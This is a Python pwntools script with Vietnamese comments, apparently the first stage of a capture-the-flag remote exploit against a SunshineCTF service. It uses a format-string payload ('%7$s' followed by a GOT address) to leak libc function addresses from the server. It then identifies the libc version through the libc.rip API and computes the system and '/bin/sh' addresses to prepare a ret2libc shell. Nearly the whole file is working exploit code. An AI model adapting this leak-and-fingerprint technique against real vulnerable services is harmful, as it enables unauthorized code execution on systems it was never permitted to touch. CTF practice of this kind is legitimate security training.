#!/usr/bin/env python3
# fingerprint_libc.py
# ---------------------------------------------------------------------------
# BUOC 1 cua khai thac remote: XAC DINH DUNG PHIEN BAN LIBC cua server.
#
# Y TUONG:
#   dia_chi_that = libc_base + offset_ham
#   => dia_chi & 0xfff == offset_ham & 0xfff   (12 bit thap KHONG doi theo ASLR)
#   12 bit thap cua tung ham la "dau van tay" -> tra libc.rip.
#
# CANH BAO KY THUAT QUAN TRONG:
#   - strlen, strcspn la IFUNC trong glibc. GOT cua chung tro toi BAN THUC THI
#     duoc chon luc load (vd __strlen_avx2), KHONG phai offset cua symbol
#     trong bang symbol. => KHONG dung chung de fingerprint chinh xac.
#   - read, write, setvbuf la FUNC binh thuong -> dung de fingerprint.
#   - Va 1 so phien ban libc tren libc.rip KHONG co 'setvbuf' -> chi dung
#     read + write cho chac an.
#
# SCRIPT LAM GI:
#   1. Noi toi server, dung %7$s doc GOT => leak write/read/strlen/strcspn/setvbuf
#   2. Hoi libc.rip bang 12 bit thap cua read + write
#   3. Voi tung ung vien: tinh base = leak - offset cho tung ham.
#      libc nao cho CUNG MOT base (va base page-aligned) => dung la libc server.
#   4. Tai libc khop ve ./libc.so.6 va in offset system + "/bin/sh" thuc te.
#
# Chay:  python3 fingerprint_libc.py
# ---------------------------------------------------------------------------

import json
import urllib.request

from pwn import ELF, context, log, p64, remote, u64

context.log_level = "info"
context.arch = "amd64"

HOST = "chal.sunshinectf.games"
PORT = 26002

# GOT that cua binary (No PIE => dia chi co dinh)
GOT = {
    "write":   0x404000,
    "strlen":  0x404008,
    "strcspn": 0x404010,
    "read":    0x404018,
    "setvbuf": 0x404020,
}

# Chi dung 2 ham nay de fingerprint (FUNC that, co trong DB libc.rip)
FINGERPRINT = ["read", "write"]


def leak_addr(p, addr):
    """Doc 8 byte tai `addr` bang %7$s, tra ve (gia tri, so byte doc duoc)."""
    #  offset 0 : "%7$s"        -> in chuoi tai con tro la arg #7
    #  offset 4 : 4 byte NUL    -> ket thuc chuoi format
    #  offset 8 : 8 byte addr   -> chinh la arg #7
    payload = b"%7$s" + b"\x00" * 4 + p64(addr)
    p.recvuntil(b"score> ")
    p.sendline(payload)
    raw = p.recvline().rstrip(b"\n")          # %s in den khi gap NUL
    return u64(raw.ljust(8, b"\x00")), len(raw)


def query_libc_rip(leaks):
    q = {n: format(leaks[n] & 0xFFF, "x") for n in FINGERPRINT}
    log.info("Query libc.rip: %s", json.dumps(q))
    req = urllib.request.Request(
        "https://libc.rip/api/find",
        data=json.dumps({"symbols": q}).encode(),
        headers={"Content-Type": "application/json"},
    )
    return json.loads(urllib.request.urlopen(req, timeout=30).read())


def pick_exact(cands, leaks):
    """Ung vien nao cho CUNG base cho moi ham fingerprint => chinh xac."""
    exact = []
    for c in cands:
        syms = c.get("symbols", {})
        bases, used = set(), 0
        for n in FINGERPRINT:
            off = syms.get(n)
            if off is None:
                continue
            off = int(off, 16) if isinstance(off, str) else off
            bases.add(leaks[n] - off)
            used += 1
        if used == len(FINGERPRINT) and len(bases) == 1:
            base = bases.pop()
            if base & 0xFFF == 0:
                exact.append((c, base))
    return exact


def main():
    p = remote(HOST, PORT)
    leaks = {}
    for name, addr in GOT.items():
        val, n = leak_addr(p, addr)
        leaks[name] = val
        log.success("%-8s @ %#x -> %#018x  (low12=%#03x, %d byte)",
                    name, addr, val, val & 0xFFF, n)
    p.close()

    cands = query_libc_rip(leaks)
    log.info("libc.rip tra ve %d ung vien", len(cands))

    exact = pick_exact(cands, leaks)
    if not exact:
        log.failure("Khong tim duoc libc khop hoan toan -> chay lai (ASLR co the lam leak hong)")
        for c in cands[:15]:
            print("   ung vien:", c.get("id"), c.get("download_url"))
        return

    # Nhieu patch version co the trung read/write -> tai ban dau tien.
    c, base = exact[0]
    log.success("LIBC KHOP: %s", c.get("id"))
    log.success("libc_base = %#x", base)
    log.info("co %d ung vien khop (cac patch gan giong nhau)", len(exact))

    url = c.get("download_url")
    log.info("tai libc: %s", url)
    data = urllib.request.urlopen(url, timeout=60).read()
    with open("libc.so.6", "wb") as f:
        f.write(data)
    log.success("da luu ./libc.so.6 (%d byte)", len(data))

    libc = ELF("./libc.so.6", checksec=False)
    system = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    log.success("offset system   = %#x", system)
    log.success("offset /bin/sh  = %#x", binsh)
    log.info("system that  = %#x", base + system)
    log.info("binsh that   = %#x", base + binsh)

    print("\n[*] Buoc tiep theo: chay  python3 exploit_remote.py")


if __name__ == "__main__":
    main()
